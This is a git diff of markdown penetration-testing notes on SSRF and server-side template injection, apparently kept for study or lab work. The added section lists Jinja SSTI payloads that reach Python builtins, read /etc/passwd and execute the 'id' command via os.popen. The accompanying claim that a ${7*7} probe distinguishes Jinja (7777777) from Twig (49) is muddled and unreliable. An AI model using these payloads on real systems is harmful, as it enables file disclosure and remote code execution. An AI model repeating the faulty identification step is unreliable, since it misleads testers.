@@ -6,6 +6,7 @@
 ### Confirming SSRF
 <img width="1552" height="264" alt="image" src="https://github.com/user-attachments/assets/911ee48e-dfa8-4b2a-b10c-a0917e32b726" />
 It's possible to identifying with:
+
 - Ping
 <img width="1553" height="220" alt="image" src="https://github.com/user-attachments/assets/5c4e5f7a-e469-45b6-b280-594c981abe0e" />
 
@@ -42,6 +43,7 @@ python2.7 gopherus.py
 ## Blind
 - Identify with netcat
 - Identifying with the answer of the backend
+
 Incorrect Payload
 <img width="1544" height="236" alt="image" src="https://github.com/user-attachments/assets/b6b64736-060a-4aad-859b-4525a692923a" />
 
@@ -52,8 +54,19 @@ Correct Payload
 ## Identifying 
 ```bash
 ${{<%[%'"}}%\.
+{7*7}
 ```
 - Identifying template
 <img width="1440" height="943" alt="image" src="https://github.com/user-attachments/assets/a007c8e6-b48c-4d03-b55c-3a900cbb7de8" />
 
 I.e: Sending this ipout ${7*7}, if the answer is this 7777777 is a Jinja Template else if the answer is this 49 is a Twig Template
+
+- Jinja Exploit (python)
+```bash
+{{ config.items() }}
+{{ self.__init__.__globals__.__builtins__ }}
+# LFI
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
+# RCE
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
